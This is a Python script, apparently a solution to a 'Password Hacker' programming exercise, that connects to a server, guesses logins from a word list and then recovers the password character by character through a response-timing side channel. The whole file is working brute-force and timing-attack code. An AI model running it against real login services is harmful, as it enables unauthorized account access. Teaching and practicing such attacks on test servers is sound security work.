# write your code here
import sys
import socket
import itertools
import json
import datetime
# from typing import Any, Tuple


def iter_alphanum():
    aplhanum = tuple(map(chr, range(ord("a"), ord("z") + 1))) \
               + tuple(map(chr, range(ord("A"), ord("Z") + 1))) \
               + tuple(map(chr, range(ord("0"), ord("9") + 1)))
    it = (aplhanum,)
    while True:
        for i in itertools.product(*it):
            s = ""
            for j in i:
                s += j
            yield s
        it = it + (aplhanum,)


def iter_file(filename):
    with open(filename, "r") as f:
        for i in f:
            s = i.strip()
            if s.isalpha():
                for j in itertools.product((False, True), repeat=len(s)):
                    rs: str = ""
                    for k, kk in enumerate(j):
                        rs += s[k].swapcase() if kk else s[k]
                    yield rs


def iter_login_file(filename):
    with open(filename, "r") as f:
        for i in f:
            yield i.strip()


def log_pas_to_json(log, psw):
    d_lp = {
        "login": log,
        "password": psw
    }
    return json.dumps(d_lp, indent=4)


def respond_from_json(r_json):
    respond_dict = json.loads(r_json)
    return respond_dict["result"]


def brut(host, port, i_l, i_an):
    with socket.socket() as my_socket:
        address = (host, port)
        login = next(i_l)
        password = " "
        right_part = ""
        my_socket.connect(address)
        my_socket.send(log_pas_to_json(login, password).encode("utf-8"))
        resp_raw = my_socket.recv(1024)
        respond = respond_from_json(resp_raw.decode())
        while respond == "Wrong login!":
            login = next(i_l)
            my_socket.send(log_pas_to_json(login, password).encode("utf-8"))
            send_time = datetime.datetime.now()
            resp_raw = my_socket.recv(1024)
            resp_time = datetime.datetime.now()
            time_diff = resp_time - send_time
            respond = respond_from_json(resp_raw.decode())
        while respond == "Wrong password!":
            password = right_part + next(i_an)
            my_socket.send(log_pas_to_json(login, password).encode("utf-8"))
            send_time = datetime.datetime.now()
            resp_raw = my_socket.recv(1024)
            resp_time = datetime.datetime.now()
            respond = respond_from_json(resp_raw.decode())
            if (resp_time - send_time).total_seconds() - time_diff.total_seconds() > 0.001:
                right_part += password[len(right_part)]
                respond = "Wrong password!"
                i_an = iter_alphanum()
            time_diff = resp_time - send_time
        if respond == "Connection success!":
            return log_pas_to_json(login, password)


if len(sys.argv) > 2:
    h = sys.argv[1]
    p = int(sys.argv[2])
    itr = iter_alphanum()
    itf = iter_file("/Users/Lars/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt")
    itrlf = iter_login_file("/Users/Lars/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt")
    pw = brut(h, p, itrlf, itr)
    while pw is None:
        pw = brut(h, p, itrlf, itr)
    print(pw)
